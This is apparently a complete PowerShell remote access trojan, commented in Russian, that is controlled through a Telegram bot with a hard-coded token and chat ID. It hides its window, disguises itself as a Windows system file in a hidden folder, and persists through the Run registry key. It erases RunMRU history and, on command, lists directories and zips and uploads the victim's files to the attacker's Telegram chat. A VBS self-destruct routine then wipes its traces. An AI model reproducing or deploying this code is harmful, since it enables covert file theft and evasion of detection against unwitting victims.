# RAT через Telegram Bot
$Token = "8429674512:AAEomwZivan1nhKIWx4LTlyFKJ6ztAGu8Gs"
$ChatID = "5674514050"

# Установка кодировки UTF-8 для корректного отображения русских символов
[Console]::OutputEncoding = [System.Text.Encoding]::UTF8
$PSDefaultParameterValues['*:Encoding'] = 'utf8'

# Настройки скрытности
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName System.IO.Compression.FileSystem

# Скрытие окна PowerShell
$windowCode = '[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);'
$windowAPI = Add-Type -MemberDefinition $windowCode -Name Win32ShowWindowAsync -Namespace Win32Functions -PassThru
$windowAPI::ShowWindow(([System.Diagnostics.Process]::GetCurrentProcess() | Get-Process).MainWindowHandle, 0) | Out-Null

# Функция отправки сообщений с правильной кодировкой
function Send-Telegram {
    param([string]$Message, [string]$FilePath = $null)
    
    $lastMessage = $global:LastSentMessage
    if ($Message -eq $lastMessage) { return }
    $global:LastSentMessage = $Message
    
    $url = "https://api.telegram.org/bot$Token/sendMessage"
    $body = @{
        chat_id = $ChatID
        text = $Message
    }
    
    try {
        $jsonBody = $body | ConvertTo-Json
        $response = Invoke-RestMethod -Uri $url -Method Post -Body $jsonBody -ContentType "application/json; charset=utf-8" -UseBasicParsing
    } catch { 
        try {
            # Альтернативный метод с формой
            $form = @{
                chat_id = $ChatID
                text = $Message
            }
            $response = Invoke-RestMethod -Uri $url -Method Post -Body $form -UseBasicParsing
        } catch { }
    }
    
    if ($FilePath -and (Test-Path $FilePath)) {
        Send-TelegramFile -FilePath $FilePath
    }
}

# Функция отправки файлов
function Send-TelegramFile {
    param([string]$FilePath)
    
    $url = "https://api.telegram.org/bot$Token/sendDocument"
    
    try {
        $fileBytes = [System.IO.File]::ReadAllBytes($FilePath)
        $fileEnc = [System.Text.Encoding]::GetEncoding('ISO-8859-1').GetString($fileBytes)
        $boundary = [System.Guid]::NewGuid().ToString()

        $bodyLines = (
            "--$boundary",
            "Content-Disposition: form-data; name=`"chat_id`"",
            "",
            $ChatID,
            "--$boundary",
            "Content-Disposition: form-data; name=`"document`"; filename=`"$(Split-Path $FilePath -Leaf)`"",
            "Content-Type: application/octet-stream",
            "",
            $fileEnc,
            "--$boundary--"
        ) -join "`r`n"

        Invoke-RestMethod -Uri $url -Method Post -ContentType "multipart/form-data; boundary=$boundary" -Body $bodyLines -UseBasicParsing
    } catch {
        try {
            # Резервный метод отправки файла
            $fileInfo = Get-Item $FilePath
            $fileStream = [System.IO.File]::OpenRead($FilePath)
            $form = @{
                chat_id = $ChatID
                document = $fileStream
            }
            Invoke-RestMethod -Uri $url -Method Post -Form $form -UseBasicParsing
            $fileStream.Close()
        } catch { }
    }
}

# Функция создания ZIP архива
function Compress-Folder {
    param([string]$FolderPath, [string]$ZipPath)
    
    try {
        [System.IO.Compression.ZipFile]::CreateFromDirectory($FolderPath, $ZipPath, [System.IO.Compression.CompressionLevel]::Fastest, $false)
        return $true
    } catch {
        try {
            # Резервный метод архивации через COM
            $shell = New-Object -ComObject Shell.Application
            $zipFolder = $shell.NameSpace($ZipPath)
            $sourceFolder = $shell.NameSpace($FolderPath)
            $zipFolder.CopyHere($sourceFolder.Items())
            Start-Sleep -Seconds 3
            return $true
        } catch {
            return $false
        }
    }
}

# Уникальное имя файла для скрытности (имитация системного файла)
$uniqueName = "Windows_Core_System_" + (Get-Date).ToString("yyyyMMdd") + ".exe"
$scriptPath = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore\$uniqueName"
$scriptDir = "$env:USERPROFILE\AppData\Local\Microsoft\WindowsCore"

# Создание директории если не существует
if (!(Test-Path $scriptDir)) { 
    New-Item -ItemType Directory -Path $scriptDir -Force | Out-Null
    # Установка скрытого атрибута
    Set-ItemProperty -Path $scriptDir -Name Attributes -Value ([System.IO.FileAttributes]::Hidden) -ErrorAction SilentlyContinue
}

# Установка в автозагрузку
$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
if (!(Test-Path $regPath)) { New-Item -Path $regPath -Force | Out-Null }
$scriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw
$scriptContent | Out-File -FilePath $scriptPath -Encoding UTF8
Set-ItemProperty -Path $regPath -Name "WindowsCoreSystem" -Value "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$scriptPath`"" -Force

# Очистка истории RUN при установке
Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction SilentlyContinue

# Основные переменные
$currentDir = "C:\"
$global:LastSentMessage = ""

# Отправка информации о запуске
Send-Telegram "RAT активирован на $env:COMPUTERNAME
Доступные команды:
/help - список команд
/ls - список файлов
/cd [папка] - сменить директорию
/download [файл] - скачать файл
/selfdestruct - самоуничтожение"

# Основной цикл опроса
while ($true) {
    try {
        $offset = if ($global:LastUpdateId) { $global:LastUpdateId + 1 } else { 0 }
        $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$offset&timeout=60" -Method Get -UseBasicParsing
        
        if ($updates.ok -and $updates.result.Count -gt 0) {
            foreach ($update in $updates.result) {
                $global:LastUpdateId = $update.update_id
                
                if ($update.message.chat.id -eq $ChatID) {
                    $command = $update.message.text
                    
                    # Обработка команд
                    switch -regex ($command) {
                        "^/help$" {
                            Send-Telegram "Доступные команды:
/help - показать это сообщение
/ls - список файлов в текущей директории
/cd [папка] - сменить директорию
/download [файл] - скачать файл или папку
/selfdestruct - самоуничтожение RAT"
                        }
                        "^/ls$" {
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "Содержимое $currentDir
$($fileList -join "`n")"
                        }
                        "^/cd (.+)$" {
                            $newDir = $matches[1].Trim()
                            if ($newDir -eq "..") {
                                $currentDir = Split-Path $currentDir -Parent
                                if (!$currentDir) { $currentDir = "C:\" }
                            } else {
                                $testPath = Join-Path $currentDir $newDir
                                if (Test-Path $testPath -PathType Container) {
                                    $currentDir = $testPath
                                } else {
                                    Send-Telegram "Директория не найдена: $newDir"
                                    continue
                                }
                            }
                            
                            # Отправляем содержимое новой директории с помощью /ls
                            $items = Get-ChildItem -Path $currentDir -Force
                            $fileList = @()
                            foreach ($item in $items) {
                                $type = if ($item.PSIsContainer) { "📁" } else { "📄" }
                                $size = if (!$item.PSIsContainer -and $item.Length) { " ($([math]::Round($item.Length/1KB,2)) KB)" } else { "" }
                                $fileList += "$type $($item.Name)$size"
                            }
                            Send-Telegram "/ls $currentDir
$($fileList -join "`n")"
                        }
                        "^/download (.+)$" {
                            $target = $matches[1].Trim()
                            $fullPath = Join-Path $currentDir $target
                            
                            if (Test-Path $fullPath) {
                                if (Test-Path $fullPath -PathType Container) {
                                    # Архивируем папку
                                    $zipPath = "$env:TEMP\$([System.IO.Path]::GetRandomFileName()).zip"
                                    if (Compress-Folder -FolderPath $fullPath -ZipPath $zipPath) {
                                        Send-Telegram "Папка $target заархивирована" $zipPath
                                        Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                                    } else {
                                        Send-Telegram "Ошибка архивации папки: $target"
                                    }
                                } else {
                                    Send-Telegram "Файл $target отправлен" $fullPath
                                }
                            } else {
                                Send-Telegram "Файл/папка не найдены: $target"
                            }
                        }
                        "^/selfdestruct$" {
                            # Создание VBS скрипта для самоуничтожения
                            $vbsContent = @"
On Error Resume Next
Set WshShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

' Отправка начального сообщения
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
http.setRequestHeader "Content-Type", "application/json"
http.Send "{""chat_id"": ""$ChatID"", ""text"": ""🔄 Запущен процесс самоуничтожения RAT...""}"

' Ожидание завершения PowerShell процессов
WScript.Sleep 5000

' Завершение всех процессов PowerShell
For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='powershell.exe'")
    Process.Terminate()
Next

' Завершение процессов wscript
For Each Process in objWMIService.ExecQuery("Select * from Win32_Process Where Name='wscript.exe'")
    Process.Terminate()
Next

WScript.Sleep 2000

' Удаление файлов RAT
If fso.FileExists("$scriptPath") Then
    fso.DeleteFile "$scriptPath", True
End If

If fso.FileExists("$($MyInvocation.MyCommand.Path)") Then
    fso.DeleteFile "$($MyInvocation.MyCommand.Path)", True
End If

' Удаление директории если пустая
If fso.FolderExists("$scriptDir") Then
    fso.DeleteFolder "$scriptDir", True
End If

' Очистка реестра
On Error Resume Next
WshShell.RegDelete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsCoreSystem"
WshShell.Run "reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f", 0, True

' Проверка успешности удаления
Dim success
success = True

If fso.FileExists("$scriptPath") Then
    success = False
End If

If fso.FolderExists("$scriptDir") Then
    success = False
End If

' Отправка отчета в Telegram
If success Then
    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""✅ RAT успешно самоуничтожен. Все следы удалены: файлы, процессы, записи реестра.""}"
Else
    http.Open "POST", "https://api.telegram.org/bot$Token/sendMessage", False
    http.setRequestHeader "Content-Type", "application/json"
    http.Send "{""chat_id"": ""$ChatID"", ""text"": ""❌ Ошибка при самоуничтожении RAT. Некоторые файлы не были удалены.""}"
End If

' Самоуничтожение VBS скрипта
fso.DeleteFile WScript.ScriptFullName, True
"@

                            $vbsPath = "$env:TEMP\cleanup_" + (Get-Random) + ".vbs"
                            $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII
                            
                            # Запуск VBS скрипта
                            $process = Start-Process -FilePath "wscript.exe" -ArgumentList "//B `"$vbsPath`"" -PassThru -WindowStyle Hidden
                            
                            # Немедленный выход из основного скрипта
                            exit
                        }
                    }
                }
            }
        }
    } catch { 
        Start-Sleep -Seconds 5
    }
}
